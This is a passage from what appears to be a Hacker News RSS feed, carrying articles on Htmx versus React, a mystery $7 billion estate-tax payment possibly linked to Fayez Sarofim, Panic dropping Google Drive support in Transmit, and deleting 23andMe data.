<p>Htmx does not provide a good story for this. We have some ideas, but
they all have big caveats: use query parameters, use hidden form inputs,
use event triggers.</p>
<p>React and Halogen (see also <a href="https://chrisdone.com/posts/halogen-is-better-than-react/">Halogen
is better than React at everything</a>) <em>do</em> have an answer to
this. In both cases, child components have their own state, and parents
can give them “props” which are pretty much “advice”, and they also have
their own internal state, and can choose to ignore/take precedence over
props. The props are typically sourced from the server or derived from
the server, and the state is usually some client-side state.</p>
<p>We often do need to use React for off-the-shelf components or
components that we have to use that are just provided as React. React
and Htmx do not interact nicely.</p>
<ul>
<li>We’ve done some unsatisfying work with WebComponents, but those
things have bizarre limitations that are surprising.</li>
<li>We’ve also made a bridge directly to React components that we use
from our server-side language, but in general Htmx and React fight for
control over the flow of state and management of DOM elements.</li>
<li>We’ve played with Alpine, which is nice, but it represents <em>yet
another</em> client-side-programming library and is therefore redundant
if React is already in your codebase.</li>
</ul>
<h2 id="the-up-sides">The up sides</h2>
<p>Our current thinking is that being able to use your server side
language is <strong>a huge obvious and uncontroversial win</strong>, no
one on the team would want to go back to writing all this business logic
in TypeScript:</p>
<ul>
<li>No serialisation from our DB types to frontend types is needed.
<ul>
<li>No data leaks, and no GraphQL needed.</li>
</ul></li>
<li>We can use our (in our opinion) more powerful abstraction facilities
of the server-side language.</li>
<li>We can use the form builder in our server side language; instead of
doing one frontend <em>and also</em> one backend implementation of the
same validations.</li>
</ul>
<p>But the above downsides are real.</p>
<h2 id="htmx-in-react">Htmx-in-React?</h2>
<p>An attractive future direction might be to re-implement Htmx in
React:</p>
<ul>
<li>The server sends a JSON blob that React converts into virtual DOM
components.</li>
<li>That would solve the component state problem.</li>
<li>It would mean we require no special bridge to use React
components.</li>
<li>It would let us use our React-connected web fetching library, and
carefully avoid the queuing choices made by Htmx.</li>
<li>It would solve the morphdom problems and browser DOM input elements
problem, too, which is pretty much a solved problem in React.</li>
</ul>
<p>In this way, we could drop the Htmx dependency but retain the
benefits of the idea. That is, given a budget to embark on such a big
piece of work.</p>




    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Who died and left the US $7B? (262 pts)]]></title>
            <link>https://sherwood.news/power/who-died-and-left-the-us-7-billion-fayez-sarofim/</link>
            <guid>41780569</guid>
            <pubDate>Tue, 08 Oct 2024 18:58:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sherwood.news/power/who-died-and-left-the-us-7-billion-fayez-sarofim/">https://sherwood.news/power/who-died-and-left-the-us-7-billion-fayez-sarofim/</a>, See on <a href="https://news.ycombinator.com/item?id=41780569">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-testid="article-body-content"><p>Billionaires are like black holes. We deduce their existence from the fundamental laws of capitalism, see their gravity pull politics into their orbit, even detect signals of their existence in the public markets.</p><p>Determining exactly how rich anyone really is, though, can be a fool’s errand. The most profound revelation in Thomas Piketty’s era-defining “Capital in the Twenty-First Century” wasn’t that we were experiencing Gilded Age levels of inequality, but his argument that Forbes’ list of the ultrawealthy isn’t accurate — and we don’t really know the billionaires living among us, or the extent of their wealth.</p><p>Last year, observers with the economic equivalent of a radio telescope detected a radiating anomaly on the February 28, 2023, daily balance sheet of the US Treasury Department: a $7 billion estate- and gift-tax payment.&nbsp;</p><p>John Ricco, now an analyst at Yale University’s Budget Lab, first spotted the huge receipt while trying to answer a somewhat macabre question: how did senior-citizen deaths from Covid affect government revenues? (<a href="https://budgetlab.yale.edu/news/240607/pandemic-era-trends-estate-tax-collections" target="_blank" rel="noopener">Quite a bit</a> — high mortality and the frenzied pandemic stock market more than offset the Trump administration’s tax cuts.)</p><p>He was struck, though, by the appearance of that enormous deposit. “The degree by which this payment exceeds others in modern history — it’s not just, ‘Oh, this was the biggest one by 20%,’” Ricco said later. This was the biggest one by a factor of seven.</p><p>The data wasn’t erroneous, Treasury officials found, who are legally forbidden to discuss tax filings. But it was a mystery. Who died? And why didn’t they hire better tax attorneys?</p><p>It’s not just that this number is an outlier. These days, paying the estate tax is almost optional. Most estates aren’t taxed, and most people with an estate that is taxable — worth more than $13.6 million, or $27.2 million for a married couple — can afford to <a href="https://www.propublica.org/article/more-than-half-of-americas-100-richest-people-exploit-special-trusts-to-avoid-estate-taxes" target="_blank" rel="noopener">minimize its impact</a> with careful tax planning and philanthropic largesse. When David Koch, the heir and conservative political activist, died in 2019, his reported $42.2 billion fortune didn’t leave a ripple in the estate-tax data. After that $7 billion payment, the next highest receipt since 2005 was just over $1 billion deposited on January 10, 2017.&nbsp;&nbsp;</p><p>These days, paying the estate tax is almost optional.</p><p>You don’t wind up one of the richest people in the world without entanglement in the world of wealth-management advisers and tax attorneys. Martin Behn, an attorney at the firm Lathrop GPM who specializes in estate planning, said that sufficiently advanced planning and enough charitable donations can dramatically reduce an end-of-life levy.</p><p>There are many complexities, but one popular technique is to put assets into trusts that allow the returns to accrue for heirs without taxation. Nike founder Phil Knight, for example, put his company’s stock in a series of trusts to benefit his children. The trusts pay him a modest return, but the rest of the gains avoid incurring estate tax, including Nike shares that were worth $6.1 billion in 2021, <a href="https://bloomberg.com/features/how-billionaires-pass-wealth-to-heirs-tax-free-2021/" target="_blank" rel="noopener">Bloomberg reported</a>. Such scrutiny was possible only because Knight’s position as an executive and board member at a publicly traded company entailed SEC disclosures.&nbsp;</p><div><p>Behn’s clients typically want to maximize the money they leave for their children or establish a philanthropic legacy; some seek to do both. But there’s a third group. “They say, ‘I don’t care, we’ll pay taxes. Why is the federal government any worse than the charity down the street?’”</p><p>“It feels a little un-American,” Behn said. “Usually European clients have that kind of mentality.” He referenced a quote by Learned Hand, the esteemed jurist <a href="https://law.justia.com/cases/federal/appellate-courts/F2/69/809/1562063/" target="_blank" rel="noopener">who wrote</a> that “there is not even a patriotic duty to increase one’s taxes” in a 1934 opinion.</p></div><p>Behn suspects our mystery estate originates from someone in that camp. There are other possible explanations, like dying without heirs, or without heirs you like enough to go to great lengths to preserve your dynastic wealth. Another could be family discord. A messy divorce could break apart carefully structured inheritance trusts, or cause a Rupert Murdoch-esque late-in-life reallocation between multiple heirs.&nbsp;</p><p>I tried to narrow down some suspects. Based on estimates of the <a href="https://www.cbpp.org/research/federal-tax/policy-basics-the-estate-tax" target="_blank" rel="noopener">average tax rate</a> on estates, the February 2023 payment implied the death of someone possessing a fortune between $17.5 and $40 billion. At the upper range, it would make the person one of the 100 richest people in the world, at least on <a href="https://www.bloomberg.com/billionaires/" target="_blank" rel="noopener">Bloomberg’s billionaire index</a>.&nbsp;</p><p>And, typically, the estate tax has to be paid within nine months of death, though that can vary with extensions or audits. That suggests our billionaire strode off this mortal coil in 2022.&nbsp;</p><p>We lost a few that year: <a href="https://www.nytimes.com/2022/09/16/business/herbert-kohler-dead.html" target="_blank" rel="noopener">Herb Kohler</a>, the plumbing magnate; <a href="https://www.nytimes.com/2022/10/13/realestate/robert-toll-dead.html" target="_blank" rel="noopener">Robert Toll</a>, the homebuilder; <a href="https://www.nytimes.com/2022/03/24/business/edward-c-johnson-iii-dead.html" target="_blank" rel="noopener">Edward Johnson III</a>, who built financial giant Fidelity. But despite each possessing a giant fortune, none was known, at least publicly, to have one large enough to incur a $7 billion levy — unless, against all odds, their estates made payments on the same day.&nbsp;</p><p>The Republican megadonor and casino mogul <a href="https://www.nytimes.com/2021/01/12/business/sheldon-adelson-dead.html" target="_blank" rel="noopener">Sheldon Adelson</a> passed in 2021 with an estate worth a reputed $35 billion. Could a dispute with the IRS have dragged out that payment until 2023?&nbsp;</p><p>No one would say, and it seemed we’d never know.</p><hr><p>Last year, I published a <a href="https://qz.com/can-a-billionaire-die-without-anyone-noticing-1850268606" target="_blank" rel="noopener">brief story</a> about the statistical mystery and had nearly forgotten about it months later when I got a phone call from a number I didn’t recognize.&nbsp;</p><p>The voice on the other end of the line was calling about my mysterious billionaire. A financial-services professional, the source was familiar with the handling of a certain large and publicly undervalued estate that matched the timing of the enormous payment.&nbsp;</p><p>Further, the person suggested that the late billionaire hadn’t sought to avoid the tax; they didn’t care about the bite being taken out of their fortune by the government, just as Behn suspected. The deceased was glad to pay up, this source said, because they came to the US as an immigrant and the country had provided them a huge opportunity.&nbsp;</p><p>The voice struck me as familiar with the world of high-end services available to family offices of the superwealthy. The tale seemed like a strange story to make up. If the family in question wanted to bask in the glow of public gratitude, why not simply announce it?&nbsp;</p><p>Of course, the phone number was a burner. But before they hung up, the source gave me a name for the nation’s late benefactor: Fayez Sarofim.&nbsp;</p><p>From afar, Sarofim fits the bill. A billionaire who existed largely beyond the eye of national news, he died in May 2022, and, most importantly to our purposes, made his fortune in opaque private-investment vehicles, not in publicly traded companies, over a six-decade career.&nbsp;</p><p>The son of an Egyptian landowner, Sarofim attended college in the US and moved to Houston in the 1950s. He soon hung out his shingle as an investment manager (reportedly with $100,000 from his father in hand) and gained a reputation for meticulous analysis, winning the business of Houston’s upper crust and managing the pensions of the companies they owned and universities they patronized.&nbsp;</p><p>Before they hung up, the source gave me a name for the nation’s late benefactor: Fayez Sarofim.&nbsp;</p><div><p>Sarofim’s clients called him the Sphinx. As <a href="https://www.texasmonthly.com/articles/cant-buy-me-love/" target="_blank" rel="noopener">Texas Monthly</a> wrote in 2000: “He spends most of his days at his office on the twenty-ninth floor of Two Houston Center, dressed as always in a tailored three-piece suit, silently smoking a cigar, his owlish face contemplative, as if he might never speak again but gradually turn into a monument.”&nbsp; </p><p>As a businessman, he was sagacious. Famously, he wouldn’t buy Enron because he couldn’t make sense of the balance sheet. He made headway into Houston society, marrying Louisa Stude, the adopted daughter of the founder of Brown &amp; Root, the enormous oil-services company, and bought a mansion in the tony River Oaks neighborhood.</p></div><p>In 1979, though, love intervened. An affair resulted in a $250 million divorce, a new marriage, another expensive separation, and various other bits of soap-opera-worthy drama, culminating in his final marriage in 2015 to a son’s ex-wife’s mother.</p><p>But what about the money? Forbes, which <a href="https://www.forbes.com/sites/christopherhelman/2022/05/29/fayez-sarofim-the-egypt-born-texas-billionaire-made-a-fortune-betting-on-americas-blue-chip-entrepreneurs/" target="_blank" rel="noopener">first interviewed</a> him in 1969, assessed his net worth in 2022 at $1.5 billion. He dropped off the Forbes 400 list in 2016. In 2000, Texas Monthly estimated his net worth at $2 billion to $3 billion and suggested his firm managed $45 billion. Upon his death, <a href="https://www.sec.gov/Archives/edgar/data/937729/000095012322005920/xslForm13F_X02/primary_doc.xml" target="_blank" rel="noopener">SEC filings</a> pegged the firm’s assets under management at $31.6 billion.&nbsp;</p><p>With standard fee structures, Sarofim’s company might’ve been earning $100 million or more a year running that much money. He was also a minority owner of the NFL’s Houston Texans, which was purchased for $700 million in 1999 and valued at more than $5 billion last year. And he was <a href="https://www.mfah.org/exhibitions/three-centuries-american-art-masterpieces-sarofim-collection" target="_blank" rel="noopener">an art collector</a> with an eye for appreciation, purchasing works by Picasso, Mary Cassatt, Winslow Homer, and Andy Warhol.&nbsp;</p><p>We know that Sarofim made use of trusts. <a href="https://projects.propublica.org/nonprofits/organizations/237065248/202431359349106083/full" target="_blank" rel="noopener">Tax filings</a> for his foundation reveal nearly $400 million in post-death contributions from several Sarofim vehicles, including a management trust and his estate. In a <a href="https://www.nytimes.com/1999/08/29/business/talking-money-with-donald-sultan-fayez-sarofim-portrait-artist-investor.html" target="_blank" rel="noopener">1999 interview</a> with the New York Times, he even fretted about the effect of taxes on his investment strategies, which might be a point against the case that his estate is the source of our mystery tax payment. It’s safe to say that if he did expose some share of his fortune to the tax man, it was intentional.</p><p>Ultimately, my source said Sarofim’s net worth was north of $20 billion — and that was after the expensive divorces and high-end philanthropy, like<a href="https://www.attractionsmanagement.com/attractions-news/Museum-of-Fine-Arts,-Houston,-reveals-US$450m-masterplan/313428" target="_blank" rel="noopener"> $70 million</a> for the Houston Museum of Fine Arts and<a href="https://www.uth.edu/sarofim/" target="_blank" rel="noopener"> $25 million</a> to build a health center at the University of Texas.</p><p>How could public estimates of his wealth be so far off? A few factors seem relevant, including Sarofim’s wealthy father, who may have passed an inheritance of his own to his son with assets held abroad, beyond the easy reach of US authorities. Then there’s his job. Unlike billionaires like Phil Knight whose fortunes are made (and traced) through public companies, opacity is the nature of private-investment management. Some assets under management can be assessed through public filings, but fee structures and profit distribution are closely held.&nbsp;</p><p>How could public estimates of his wealth be so far off?</p><p>Perhaps most important is what we know about Sarofim’s investment strategy. Whether or not he was patriotic about his tax payments, his reputation as an investor was betting on iconic US corporations and holding the stock long-term. He told Forbes in 1969 that it took a foreigner to see the potential of the US in the years before its post-World War II ascent as the world’s economic superpower.&nbsp;</p><p>Over 64 years of investing, there would have been a lot of compounding value. A single $100 investment in the S&amp;P 500 in 1958, with dividends reinvested, would garner you more than $76,000 today, with inflation-adjusted returns of more than 7,000%. While managing a Dreyfus mutual fund between 1990 and 1999, for example, Sarofim averaged annual returns of just over 20%, Morningstar reported. Sitting on blue chip US stocks over a lifetime is the kind of thing that might just make you a secret billionaire.&nbsp;</p><p>Can I prove it? Try the oldest son, my source suggested; see if he’ll tell you.&nbsp;</p><p>He would not. Multiple emails and calls to Christopher Sarofim, who now leads his father’s firm, Fayez Sarofim &amp; Co., were not returned. Another son, Phillip, contacted through his venture-capital firm, Trousdale Ventures, declined to comment. I didn’t hear back from Sarofim’s widow, Susan, after contacting her through her New Orleans art gallery. And Sarofim’s longtime colleague, Raye White, didn’t respond to messages left with her office or the Sarofim Foundation.</p><p>Still, there is another data point to support the allegation. As with most data produced by the federal government, more granular versions emerge with time. This year, a state-level update revealed that the $7 billion payment had indeed come from Texas. There aren’t any records to indicate the death of a different Texan with a (publicly known) fortune of that magnitude in the relevant time period.&nbsp;</p><figure><div><p><img alt="CEO's And Corporate Executives Gather For Annual Allan And Co Gathering In Sun Valley" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><figcaption><p>Sarofim in 2011. (Scott Olson/Getty Images)</p></figcaption></figure><hr><p>The estate tax is a funny levy. These days, it hardly contributes to US coffers, and the earnings are a rounding error when compared to other taxes. But it plays an outsize role in the politics of taxation, with conservatives referring to the “<a href="https://www.businessinsider.com/death-tax-or-estate-tax-2017-10" target="_blank" rel="noopener">death tax</a>” and the (<a href="https://www.cbpp.org/blog/the-myth-that-the-estate-tax-threatens-small-farms" target="_blank" rel="noopener">unsubstantiated</a>) plight of family farms while progressives bring up the disproportionate power of the superwealthy.</p><p>In the US, estates have been taxed in various ways since 1797. A nation founded with a suspicion of aristocrats always prioritized political moves trimming inherited wealth. The modern estate tax emerged alongside the income tax when 20th-century progressives pushed against the robber barons — and had to answer World War I’s demands on the federal budget.&nbsp;</p><p>These days, the estate tax hardly contributes to US coffers.</p><p>Despite growing formal and informal exemptions, today’s estate tax is the closest thing the country has to a wealth tax that someone like Sen. Bernie Sanders would like to enact. The situation seems unlikely to change when Trump’s 2017 package of tax cuts expires at the end of next year. Still, you can add “a once-in-a-decade chance to futz with tax policy” to the consequences of this year’s elections, should one party manage to win the presidency and control of Congress.&nbsp;</p><p>Absent confirmation from the Sarofims, there’s another potential source for that $7 billion payment. It’s the estate <i>and</i> gift tax, after all; the gift part is to keep people from avoiding the tax man by giving away their assets before they die.&nbsp;</p><p>Some tax attorneys I spoke with theorized that the $7 billion payment was in fact a gift tax paid as part of an estate-planning strategy designed to avoid an even larger payment down the road, a strategy they expect to be common ahead of the Trump tax expiration. (I note, without comment, that the richest person in the world, Elon Musk, moved to Texas in 2020.)</p><p>In other words, if the source isn’t the possibly patriotic Fayez, it means our secret billionaire is alive — and trying to minimize their taxes.&nbsp;</p><hr><p><i>Tim Fernholz is a journalist in Oakland, CA. He is the author of “Rocket Billionaires: Elon Musk, Jeff Bezos, and the New Space Race.”</i></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[End of the Road for Google Drive in Transmit (304 pts)]]></title>
            <link>https://blog.panic.com/end-of-the-road-for-google-drive-and-transmit/</link>
            <guid>41780395</guid>
            <pubDate>Tue, 08 Oct 2024 18:38:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.panic.com/end-of-the-road-for-google-drive-and-transmit/">https://blog.panic.com/end-of-the-road-for-google-drive-and-transmit/</a>, See on <a href="https://news.ycombinator.com/item?id=41780395">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
	
				
<figure><img fetchpriority="high" decoding="async" width="1024" height="323" src="https://blog-cdn.panic.com/wp-content/uploads/2024/10/street-ends-1024x323.jpg" alt="" srcset="https://blog-cdn.panic.com/wp-content/uploads/2024/10/street-ends-1024x323.jpg 1024w, https://blog-cdn.panic.com/wp-content/uploads/2024/10/street-ends-300x95.jpg 300w, https://blog-cdn.panic.com/wp-content/uploads/2024/10/street-ends-768x242.jpg 768w, https://blog-cdn.panic.com/wp-content/uploads/2024/10/street-ends-1536x485.jpg 1536w, https://blog-cdn.panic.com/wp-content/uploads/2024/10/street-ends-2048x646.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>We never like removing functionality from our apps. We especially don’t like doing it when it’s due to circumstances beyond our control. But, sometimes — rarely? — it can happen, and so, please take note:</p>



<p><strong>At some unknown point in the future, Google will revoke Transmit’s access to Google Drive. Sometime after that, we’ll be releasing updates to Transmit and Nova that remove the ability to create Google Drive connections.</strong></p>



<p><strong>Transmit itself is of course still in active development, and no other connection types are affected.</strong></p>



<p>(Note that existing connections should continue to work for as long as they remain authenticated!)</p>



<h2>Why Though</h2>



<p>Well, Google has a new set of policies that require apps that connect to Google Drive to go through expensive, time-consuming annual reviews, and this has made it extremely difficult for us to reasonably maintain Google Drive access. You may have seen <a href="https://ia.net/topics/our-android-app-is-frozen-in-carbonite">iA Writer’s announcement</a> that they are stopping development of their Android version for similar reasons. Our experience was different, but our circumstances are similar. While Google Drive may not be the most popular connection option in Transmit, we know many users rely on it, and we often use it here at Panic to send and receive files from the game developers we work with.&nbsp;</p>



<p>This is not a decision we took lightly, and was the result of much debate and anguish in the office. But rest assured we looked at every angle. Hopefully that explains everything.</p>



<h2>Actually, I Want to Know More</h2>



<p>Okay, okay, here’s a more background for the deeply curious. In 2019, Google <a href="https://workspace.google.com/blog/product-announcements/enhancing-security-controls-for-google-drive-third-party-apps">announced they were adding additional security checks</a> to apps with full access to users’ files on Drive. Shortly after, they prevented Transmit from authorizing new Drive users. We submitted Transmit to Google for review. And waited for months without hearing anything back.</p>



<p>Eventually, by reaching out through friends of friends of friends to find someone inside Google who could help, we got in contact with a Google employee who was very helpful in getting the process started. We went through review, and our access was restored in early 2020. Unfortunately, we were never able to get Google to approve Nova.</p>



<p>For the next couple years, the annual re-review was pretty straightforward. However, in December 2023, Google again disabled Transmit and emailed us, explaining that we would need to complete a “Cloud Application Security Assessment (CASA)” security review. The review found no security issues with Transmit, but it was an incredibly lengthy process. It involved registering with a security lab, running a vulnerability scanner on Transmit’s source code, and filling out a long form. Between each step, we had to wait for days before we’d hear back from the lab, causing the process to take nearly a month.</p>



<p>In March, Transmit was re-approved for Google Drive access — but we were told we would now need to pass this check annually. At this point, we began to question whether this yearly process was worth it.</p>



<p>Between the weeks of waiting, submitting the required documentation and the process of scanning the code, it took a significant amount of time from our engineers. For example, Google provided a Docker image for running the scanner, but it didn’t work. We had to spend more than a week debugging and fixing it. And because the scanner found no problems, it didn’t result in any improvements to Transmit. No one benefitted from this process. Not Google, not Panic, and not our users.</p>



<p>As a small, independent developer, losing this time for no benefit is a huge cost. That week could have been better spent improving our products. But even so, at the time, we resigned ourselves to the yearly checks. We didn’t want to let our users down, and hopefully, now that we had experience with it, the scanner would be easier to run next year.</p>



<p>But then… a couple of months later, <a href="https://old.reddit.com/r/androiddev/comments/1b483a6/end_of_google_drive_integration/"><strong>Google completely removed the option for us to scan our own code</strong></a>. Instead, to keep access to Google Drive, <strong>we would now have to pay one of Google’s business partners to conduct the review.</strong> They promised a discounted minimum price, but no maximum price. We realized that either we’d most likely be paying someone else a chunk of cash to run the same scanner we were running, or our bill would end up much higher.</p>



<p>These ever-shifting requirements and expenses are finally catching up to third parties. Other products have discontinued Google Drive support or come up with <a href="https://www.ghisler.com/googledrivehelp.htm">interesting workarounds</a> with various limitations that don’t work for all users. Ultimately, we think any workaround strategy is too risky and may result in banned accounts, and we definitely don’t want to be responsible for anyone getting banned.</p>



<h2>We’re Very Sorry!</h2>



<p>In short, with all these factors in play, we have decided we will not attempt to renew Google Drive access for Transmit once it expires. We’ll miss it too. We will instead focus our efforts on other features and products. We know that this situation, to put it in simplified terms, kinda sucks. If Google ever revises their security policies to be more in reach for a small software company like Panic, we will definitely take a second look.</p>



<p>Thanks for using Transmit and thanks for supporting Panic for all of these years. Onward.</p>
			
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How to delete your 23andMe data amid the company's turmoil (152 pts)]]></title>
            <link>https://lifehacker.com/health/how-to-delete-23andme-data</link>
            <guid>41780387</guid>
            <pubDate>Tue, 08 Oct 2024 18:37:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lifehacker.com/health/how-to-delete-23andme-data">https://lifehacker.com/health/how-to-delete-23andme-data</a>, See on <a href="https://news.ycombinator.com/item?id=41780387">Hacker News</a></p>
<div id="readability-page-1" class="page"><section data-ga-module="content-body">

<p>
We may earn a commission from links on this page.
</p>
<img src="https://lifehacker.com/imagery/articles/01J9CR1HT8SDYKX7N1QGGC0AQE/hero-image.fill.size_1248x702.v1728078464.jpg" alt="23andme HQ" width="1248" height="702" srcset="https://lifehacker.com/imagery/articles/01J9CR1HT8SDYKX7N1QGGC0AQE/hero-image.fill.size_400x225.v1728078464.jpg 400w, https://lifehacker.com/imagery/articles/01J9CR1HT8SDYKX7N1QGGC0AQE/hero-image.fill.size_800x450.v1728078464.jpg 800w, https://lifehacker.com/imagery/articles/01J9CR1HT8SDYKX7N1QGGC0AQE/hero-image.fill.size_1248x702.v1728078464.jpg 1600w" sizes="(max-width: 1280px) 100vw, 1280px">
<p><span>Credit: JHVEPhoto - Shutterstock</span>
</p>
<article data-autopogo="">
<hr>
<p>DNA analysis company 23andme has been in trouble lately: data was breached in a <a href="https://blog.23andme.com/articles/addressing-data-security-concerns" target="_blank" title="open in a new window" rel="noopener"><u>2023 hack</u></a>, and this September the <a href="https://investors.23andme.com/news-releases/news-release-details/independent-directors-23andme-resign-board" target="_blank" title="open in a new window" rel="noopener"><u>entire board of directors resigned</u></a> over disagreements with the CEO. That CEO, Anne Wojcicki, had said she was open to third-party takeover proposals; she only reversed that decision <a href="https://www.reuters.com/markets/deals/23andme-ceo-wojcicki-no-longer-open-third-party-takeover-proposals-filing-shows-2024-09-30/" target="_blank" title="open in a new window" rel="noopener"><u>this week</u></a>. The company is not currently for sale, but nothing about this is looking good—and it’s not clear what would happen to customer data if the company goes under.</p><h2 id="is-23andme-data-being-sold">Is 23andme data being sold?&nbsp;</h2><p>So far there is no definitive word about the company being sold, with or without its data. However, it’s reasonable to expect that the company <em>could</em> be sold, and that owner <em>could</em> inherit the data. Something similar happened when <a href="https://lifehacker.com/if-you-ever-used-promethease-your-dna-data-might-be-on-1841327595" target="_blank"><u>MyHeritage bought Promethease</u></a>, another DNA analysis company, in 2020.</p><p>Currently, your data may already be shared with other companies. If you signed up to participate in <a href="https://www.23andme.com/research/" target="_blank" title="open in a new window" rel="noopener"><u>research studies through 23andme</u></a>, “de-identified” data about you (including genetic data) has likely been given to research institutions and pharma companies. For example, 23andme <a href="https://investors.23andme.com/news-releases/news-release-details/23andme-announces-collaboration-extension-new-data-licensing" target="_blank" title="open in a new window" rel="noopener"><u>has a data licensing agreement with GSK</u></a> (formerly GlaxoSmithKline) to use the 23andme database to “conduct drug target discovery and other research.”&nbsp;</p><p>This isn’t a possible future scenario, but rather the current operation of the business. Licensing agreements like these are a big part of how 23andme makes money. Or intends to make money. Or possibly once made money. They’re not doing so great at the money making thing these days.&nbsp;</p><h2 id="what-happens-when-you-delete-your-23andme-data">What happens when you delete your 23andme data?&nbsp;</h2><p>Deleting your 23andme data doesn’t necessarily withdraw it from studies, especially since the data was “de-identified,” that is, stripped from your name and personal information. It does mean that your data will not be used in <em>future</em> research projects.</p><p>23andme <a href="https://customercare.23andme.com/hc/en-us/articles/360004944654-What-s-In-Your-Account-Settings" target="_blank" title="open in a new window" rel="noopener"><u>explains their deletion policies here</u></a> and <a href="https://customercare.23andme.com/hc/en-us/articles/212170688-Requesting-23andMe-Account-Closure" target="_blank" title="open in a new window" rel="noopener"><u>here</u></a>. It says:</p><p><em>If you participated in 23andMe Research, your Personal Information will no longer be used in any future research projects. If you asked us to store your genetic samples, they will be discarded. We will retain limited information about you, including records of this deletion request, and other information as required by law and otherwise described in our Privacy Statement.</em></p><h2 id="where-to-download-your-data-and-delete-your-account">Where to download your data and delete your account</h2><p>If you would like to keep any of your data, sign in to your account and visit your <a href="https://you.23andme.com/user/" target="_blank" title="open in a new window" rel="noopener"><u>user settings page</u></a>. (You can also opt out of research studies there.). Click <strong>View</strong> on the 23andme Data card.&nbsp;</p><p>You’ll be asked to enter your date of birth to confirm your identity. In theory this is where you can download your data, but I can’t test this—I have a 23andme account, but I must have given the company a fake date of birth all those years ago. The website just tells me to contact <a href="https://customercare.23andme.com/hc/en-us/articles/360050651194-Contact-23andMe-Customer-Care" target="_blank" title="open in a new window" rel="noopener"><u>Customer Care</u></a>.</p><p>That sounds like a pretty bullshit obstacle to me, but here we are. A redditor <a href="https://www.reddit.com/r/23andme/comments/1fvdqn9/want_to_download_raw_data_but_havent_used_my_real/" target="_blank" title="open in a new window" rel="noopener"><u>says</u></a> that Customer Care asked them to send a copy of their ID, which isn’t very useful if you used a fake date of birth. Still, the company’s documentation claims that you can download your data and delete your account if you can get past that screen. Good luck.</p><div x-data="{ showAll: false }">
<div>
<p><span>
The Best Amazon Prime Day Deals Right Now
</span></p>
</div>
<p><span>Deals are selected by our commerce team</span>
</p>
</div>
</article>

</section><div data-ga-module="content-footer">
<div>
<div>
<p><img src="https://lifehacker.com/imagery/authors/01HF2FBEW6YT2AAW890DNDQ59C/image.fill.size_150x150.v1704301214.png" alt="Illustrated headshot of Beth Skwarecki" width="150" height="150" loading="lazy">
</p>
</div>
<div>
<p>Beth Skwarecki</p>
<p>Senior Health Editor</p>
<div>
<p>Beth&nbsp;Skwarecki is Lifehacker’s Senior Health Editor. She has a bachelor’s degree in biology, has written two books, and is a certified personal trainer. She’s been writing about health, fitness, and science for over a decade, and can front squat 225 pounds.</p>
</div>
<p><a href="https://lifehacker.com/author/bethskwarecki">Read Beth's full bio</a></p><ul>
<li>
<a href="https://twitter.com/bethskw" title="Find on Twitter (Opens in a new tab)" aria-label="Visit Beth's Twitter" rel="noopener" target="_blank">
<svg>
<use href="/images/icons/spritemap.svg#sprite-social-twitter"></use>
</svg>
</a>
</li>
<li>
<a href="https://www.instagram.com/bethskw" title="Find on Instagram (Opens in a new tab)" aria-label="Visit Beth's Instagram" rel="noopener" target="_blank">
<svg>
<use href="/images/icons/spritemap.svg#sprite-social-instagram"></use>
</svg>
</a>
</li>
<li>
<a href="https://lifehacker.com/cdn-cgi/l/email-protection#1a787f6e723469716d7b687f7971735a76737c7f727b79717f6834797577" title="Send an Email (Opens in a new tab)" aria-label="Send Beth an email" rel="noopener" target="_blank">
<svg>
<use href="/images/icons/spritemap.svg#sprite-envelope"></use>
</svg>
</a>
</li>
</ul>
</div>
</div>
<div>

<div data-ga-module="latest-stories" data-ga-element="latest-stories-stripe" data-ga-action="latest-stories-stripe">

<p><a data-ga-click="" data-ga-item="image" data-ga-position="1" data-ga-label="The Best Deals on Fitness Equipment for October Prime Day" href="https://lifehacker.com/health/fitness-equipment-deals-prime-day">
<img src="https://lifehacker.com/imagery/articles/01J30P34KY5MK9PDXJQG0Y1TNR/hero-image.fill.size_75x75.v1728412055.png" alt="bike, gym bag, dumbbells, treadmill" width="75" height="75" loading="lazy">
</a>
</p></div>
<hr>
<div data-ga-module="latest-stories" data-ga-element="latest-stories-stripe" data-ga-action="latest-stories-stripe">

<p><a data-ga-click="" data-ga-item="image" data-ga-position="2" data-ga-label="The Best Fitness Smartwatch Deals for Prime Day" href="https://lifehacker.com/the-best-fitness-smartwatch-deals-for-prime-day-1850597508">
<img src="https://lifehacker.com/imagery/articles/01HF2HFPDNHVB39T8X3PBAFVC2/hero-image.fill.size_75x75.v1728400559.png" alt="Samsung, Pixel, Fitbit Ace, and Apple smartwatches" width="75" height="75" loading="lazy">
</a>
</p></div>
<hr>
</div>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Lead drinking-water pipes must be replaced nationwide, EPA says (170 pts)]]></title>
            <link>https://www.nytimes.com/2024/10/08/climate/biden-epa-lead-pipes.html</link>
            <guid>41780347</guid>
            <pubDate>Tue, 08 Oct 2024 18:32:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2024/10/08/climate/biden-epa-lead-pipes.html">https://www.nytimes.com/2024/10/08/climate/biden-epa-lead-pipes.html</a>, See on <a href="https://news.ycombinator.com/item?id=41780347">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2024/10/08/climate/biden-epa-lead-pipes.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Winamp and other media players, rebuilt for the web with Web Components (285 pts)]]></title>
            <link>https://player.style</link>
            <guid>41780297</guid>
            <pubDate>Tue, 08 Oct 2024 18:27:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://player.style">https://player.style</a>, See on <a href="https://news.ycombinator.com/item?id=41780297">Hacker News</a></p>
